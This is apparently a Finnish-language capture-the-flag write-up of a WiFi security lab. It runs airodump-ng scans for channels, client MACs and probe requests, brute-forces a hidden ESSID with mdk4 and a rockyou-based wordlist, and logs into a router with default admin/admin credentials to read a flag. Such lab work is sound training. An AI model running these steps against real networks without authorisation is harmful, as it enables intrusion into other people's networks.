## 


### 01. What is the channel that the wifi-global Access Point (AP) is currently using?

sudo su

cat /root/flag.txt

<img width="601" height="201" alt="Näyttökuva 2026-04-27 233459" src="https://github.com/user-attachments/assets/c93cd2a7-86b6-4ebf-aad8-543412596591" />


Loin Wifi-kansion komennolla mkdir ~/wifi

Skannasin kaikki kanavat löytääkseni "wifi-global" -verkon ja sen kanavan:  
sudo airmon-ng start wlan0  
sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg  

<img width="1098" height="250" alt="image" src="https://github.com/user-attachments/assets/40128e6f-0363-4f1a-b345-034bce312bc7" />

Wifi-global:in käyttämä kanava 44 löytyy sarakkeesta CH.

### 02. What is the MAC of the wifi-IT client?

Etsin ensin wifi-IT-verkon skannaamalla kaikki verkot komennolla:

sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg

Wifi-IT (BSSID: F0:9F:C2:1A:CA:25) oli kanavalla 11. Seuraavaksi skannasin pelkästään kanavaa 11 kohdistamalla skannauksen wifi-IT:n BSSID:lle:

sudo airodump-ng wlan0mon -c 11 --bssid F0:9F:C2:1A:CA:25

STATION-osiossa näkyi wifi-IT:hen yhdistynyt asiakas, jonka MAC-osoite oli 10:F9:6F:AC:53:52.

<img width="851" height="282" alt="Näyttökuva 2026-04-28 194438" src="https://github.com/user-attachments/assets/0ca351e7-c9a2-4cc9-9775-aae13eb558c3" />


### 03. What is the probe of 78:C1:A7:BF:72:46 that follows the format of the other networks in the range (wifi-)?

Yritin ensin skannata komennolla: sudo airodump-ng wlan0mon -w scan --manufacturer --wps --band abg , mutta 78:C1:A7:BF:72:46 ei ilmestynyt.  
Tämän jälkeen komennolla grep "78:C1:A7:BF:72:46" scan-01.csv , jolloin tuloksessa näkyi että laite etsi verkkoa wifi-offices.

<img width="1016" height="63" alt="image" src="https://github.com/user-attachments/assets/53614cda-20da-4e03-8e30-3f77a766d42d" />  


### 04. What is the ESSID of the hidden AP (mac F0:9F:C2:6A:88:26)?

Komennoilla:

cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ~/wifi-rockyou.txt  
iwconfig wlan0mon channel 11  
mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt  

<img width="871" height="233" alt="image" src="https://github.com/user-attachments/assets/b33503e3-5de4-4b44-9e93-f775219cf777" />

Piilotetun AP:n ESSID on: wifi-free

### 05. What is the flag in the hidden AP router behind default credentials?

Komennolla nano ~/wifi/free.conf loin free.conf -tiedoston.  

<img width="189" height="134" alt="image" src="https://github.com/user-attachments/assets/6553d87c-e1be-4ca6-83cf-1e5191c6f4c3" />

Yhdistin verkkoon komennolla wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/free.conf  

Avasin toisen terminaalin, jossa ajoin root:ina:  
sudo su  
dhclient wlan2 -v  

Avasin selaimessa 192.168.16.1 ja kirjauduin sisälle käyttäjänä admin ja salasanalla admin, jolloin löysin lipun.

<img width="694" height="308" alt="image" src="https://github.com/user-attachments/assets/bcd4158a-d644-4a19-8ad7-fd87997414d9" />





















